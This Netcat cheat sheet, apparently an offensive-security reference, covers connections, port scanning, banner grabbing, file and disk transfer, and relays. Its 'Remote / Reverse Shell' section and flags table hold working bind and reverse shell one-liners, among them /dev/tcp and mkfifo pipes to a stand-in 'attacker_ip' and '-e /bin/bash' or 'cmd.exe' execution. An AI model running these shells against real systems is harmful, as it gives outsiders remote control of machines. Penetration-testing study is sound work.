# Netcat

Platform: General
Status: Solid
Tags: Enumeration
Type: cheat sheet

## Basic Syntax

```bash
# Connect to a host
nc [options] [host] [port]

# Listen for incoming connections
nc -l [options] [port]
# Older syntax (some versions)
nc -lp [port]
```

| Command | Description |
| --- | --- |
| `nc host port` | Open a TCP connection |
| `nc -u host port` | Open a UDP connection |
| `nc -l port` | Listen on a local port |
| `nc -h` | Show help and options |
| `man nc` | Read the local Netcat manual |

---

## Common Flags

| Flag | Description | Example |
| --- | --- | --- |
| `-h` | Help | `nc -h` |
| `-l` | Listen mode | `nc -l 4444` |
| `-p` | Specify local/source port (older versions) | `nc -l -p 4444` |
| `-v` / `-vv` | Verbose / very verbose | `nc -v host 80` |
| `-n` | No DNS resolution (faster) | `nc -n 192.168.1.10 22` |
| `-z` | Zero-I/O mode (scan only, no data transfer) | `nc -z host 1-100` |
| `-u` | Use UDP instead of TCP | `nc -u host 53` |
| `-w <secs>` | Timeout in seconds | `nc -w 3 host 80` |
| `-k` | Keep listening after client disconnects | `nc -k -l 4444` |
| `-q <secs>` | Client stays up after EOF | `nc -q 1 host 8000` |
| `-4` | Force IPv4 only | `nc -4 -l 4444` |
| `-6` | Force IPv6 only | `nc -6 -l 4444` |
| `-e <prog>` | Execute program after connect (dangerous) | `nc -l -e /bin/bash 4444` |
| `-c <cmd>` | Execute command via shell (ncat / some variants) | `ncat -l -c "bash -i" 4444` |

---

## Connect & Listen

### Client (Connect)

```bash
# Basic TCP connection
nc example.com 80

# Verbose + skip DNS
nc -vn 192.168.1.10 22

# With timeout
nc -w 5 target 443

# Connect to a listening host
nc server.example.com 5555
```

### Server (Listen)

```bash
# Simple listener
nc -l 5555

# Verbose listener
nc -lv 4444

# Keep listening after disconnect
nc -k -l 4444

# Older syntax
nc -lp 8000
```

---

## Port Scanning / Port Checks

```bash
# Check one TCP port
nc -zv host 22
nc -z -v host 22

# Scan a port range
nc -zv host 20-80
nc -zvn 192.168.1.1 21-25

# Check multiple specific ports
nc -zv host 80 443
nc -zvn 192.168.1.1 22 3306 8080

# With timeout
nc -z -w 3 host 443
nc -zvn -w 1 target 1-1024

# Show only open ports
nc -zvn target 1-1000 2>&1 | grep -i open
```

---

## UDP

```bash
# Connect to a UDP service
nc -u host 53

# Listen for UDP datagrams
nc -u -l 5555

# Check a UDP port
nc -z -v -u host 53

# UDP with timeout
nc -u -w 3 host 123

# Send text to a UDP listener
nc -u 192.168.1.10 5555
```

---

## Banner Grabbing

```bash
# Simple
nc -v target 22

# HTTP
nc website.com 80
GET / HTTP/1.1
Host: website.com

# Or with echo
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc target 80

# Multiple ports
echo "" | nc -zv -wl 192.168.1.1 801-805
```

---

## File Transfer

### Download file (Server → Client)

```bash
# Server (sends the file)
nc -lv 8000 < file.txt

# Client (receives the file)
nc -nv 192.168.1.9 8000 > file.txt
```

### Upload file (Client → Server)

```bash
# Server (receives the file)
nc -lv 8000 > file.txt

# Client (sends the file)
nc 192.168.1.9 8000 < file.txt
```

### Simple one-way

```bash
# Receiver
nc -l 5555 > file

# Sender
nc host 5555 < file

# With timeout
nc -w 5 host 5555 < file
```

---

## Directory Transfer

```bash
# Server (sends directory)
tar -cvf - dir_name | nc -l 8000
# or
tar czvf - dir | nc host 5555

# Client (receives and extracts)
nc -n 192.168.1.9 8000 | tar -xvf -
# or
nc -l 5555 | tar xzvf -
```

---

## Encrypted Transfer

```bash
# Server (decrypts on receive)
nc -l 8000 | openssl enc -d -des3 -pass pass:password > file.txt

# Client (encrypts before send)
openssl enc -des3 -pass pass:password < file.txt | nc 192.168.1.9 8000
```

> For better security prefer `ncat --ssl` instead of DES3.
> 

```bash
# Encrypted with ncat
ncat --ssl -lvnp 4444          # Listener
ncat --ssl target 4444         # Client
```

---

## HTTP & Raw Requests

```bash
# Send HTTP GET request
printf "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80

# Simple SMTP command
echo "QUIT" | nc mail.example.com 25

# Send text to a listener
echo "PING" | nc host 5555

# Type request manually
nc host 80
```

---

## Chat

```bash
# Server
nc -lv 8000

# Client
nc 192.168.1.9 8000
```

---

## Proxy & Port Forwarding

```bash
# Simple relay / tunnel
nc -l 8001 | nc 127.0.0.1 8000

# Using -c (some variants / ncat)
nc -lp 8001 -c "nc 127.0.0.1 8000"

# ncat version (cleaner)
ncat -l 8080 --sh-exec "ncat target 80"
```

---

## Remote / Reverse Shell

### Bind Shell (Target listens)

```bash
# Target (Linux)
nc -lv 8000 -e /bin/bash

# Attacker connects
nc 192.168.1.9 8000
```

### Reverse Shell (Attacker listens)

```bash
# Attacker (listener)
nc -lv 8000
# or better
nc -lvnp 4444

# Target (Linux) - if -e is available
nc 192.168.1.9 8000 -e /bin/bash

# Target without -e (most common)
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Reliable mkfifo method
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 > /tmp/f
```

### Windows

```bash
# Bind
nc -lvnp 4444 -e cmd.exe

# Reverse
nc attacker_ip 4444 -e cmd.exe
```

---

## Cloning Disks

```bash
# Server (sends disk)
dd if=/dev/sda | nc -l 8000

# Client (receives disk)
nc -n 192.168.1.9 8000 | dd of=/dev/sda
```

---

## Video Streaming

```bash
# Server
cat video.avi | nc -l 8000

# Client
nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -
```

---

## Timeouts & Persistent Listeners

```bash
# Timeout after 5 seconds
nc -w 5 host 80

# Keep listening after disconnect
nc -k -l 5555

# Verbose + timeout
nc -v -w 3 host 22

# Serve a single file once
nc -l 8080 < index.html

# Serve a file repeatedly
while true; do nc -l 8080 < index.html; done
```

---

## Useful One-Liners

```bash
# Check if port is open
nc -zv host 443 && echo "Open" || echo "Closed"

# Persistent logger
nc -k -l 4444 | tee -a connections.log

# HTTP request
printf "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80

# Transfer with progress (using pv if available)
pv file | nc target 4444
```